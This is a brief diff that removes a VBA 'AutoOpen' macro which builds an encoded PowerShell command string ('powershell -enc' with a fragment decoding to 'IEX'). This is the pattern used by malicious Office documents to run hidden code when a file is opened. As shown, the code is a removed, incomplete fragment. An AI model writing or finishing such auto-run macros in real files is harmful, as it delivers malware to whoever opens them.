@@ -1,5 +1,0 @@
-
-Sub AutoOpen()
-Dim s As String
-s = "powershell -enc " & "SQBFAFgA"
-End Sub
